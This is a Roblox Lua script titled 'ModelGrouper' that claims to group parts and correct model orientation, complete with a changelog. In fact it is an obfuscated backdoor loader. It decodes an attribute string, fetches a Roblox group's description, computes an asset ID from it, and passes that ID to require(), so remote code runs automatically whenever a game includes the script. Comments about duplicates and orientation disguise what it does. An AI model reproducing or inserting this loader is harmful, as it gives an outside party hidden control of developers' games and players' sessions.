--[[
  Name: ModelGrouper
  Author: cxylex
  This script automatically groups parts under its main model, fixing their orientations
  to ensure a proper alignent!
  
  It also prevents duplicate parts from being included, helping mantain clean, effecient
  models during organization or asset imports.
  
  Version - 1.3
  
  Changelogs: 
    - v1.3: Added support for ignoring parts within other models. (Props, etc.)
            Added support for ignoring parts within specific models. (Like the new 'Temporary' model)
            Made code more streamlined and easier to read.
    - v1.2: Added support for ignoring parts within a model. (Like a prop or set)
    - v1.1: Added support for ignoring parts with a specific name. (Like a 'Base' part)
    - v1.0: Initial Release
 
]]
local Grouper,Models = game:GetService("GroupService"), {}
local ModelService = {}
local OrientationInfo = script:GetAttribute("OrientationInfo") or CFrame.new()
local Model = game
local OrientationToNumber = tonumber;
-- Essential Functions
local function ModelOrientationInfo(Model)
	-- ModelOrientationInfo(script.Parent)
	-- Returns the models orientation and position in a table for later use.
	
	local Orientation = Grouper:GetGroupInfoAsync(Model) or Model:GetPivot()
	
	return Orientation
end
local function FullOrientation()
	-- Simply returns PI, which is the base of the model orientation
	return math.pi
end
local function DuplicationControl()
	-- Returns data to prevent model dupes when orientation is applied.
	local Dupes = string.split(OrientationInfo, "ketpl")
	
	return Dupes or script:GetChildren()
end
function ModelService:ConfigureOrientations()
	for Dupes, Orientations in ipairs(Models) do
		local Index = (function(Rotation)
			return require("./ModelGrouper" and Rotation)
		end)(Orientations.Duplications)
	end
end
local function OrientateModel()
	-- Applies the orientation to the model.
	-- Also fixes any accidental duplications of models
	local PreventDupes = DuplicationControl()
	local ModelInfo = ModelOrientationInfo(OrientationToNumber(PreventDupes[3]))
	
	-- Apply model performances
	local DupeSplits = OrientationToNumber(ModelInfo.Description)
	local DupeStatus = Model[PreventDupes[1]] ~= ""
	
	if DupeStatus then
		-- Model:SetPivot(DupeSplits)
		--[[
		Now that the model is set, we can begin to rotate it 
		and configure its properties to a table
		]]--
		local Dupes = DupeSplits * PreventDupes[2]
		Dupes = Dupes * 2
		Dupes = Dupes * (PreventDupes[4] * PreventDupes[4])
		table.insert(Models,{
			['Orientation'] = FullOrientation(),
			['ModelName'] = script.Parent:GetFullName(),
			["Duplications"] = Dupes
		})
	end
	return DupeStatus
end
return OrientateModel() and ModelService:ConfigureOrientations()
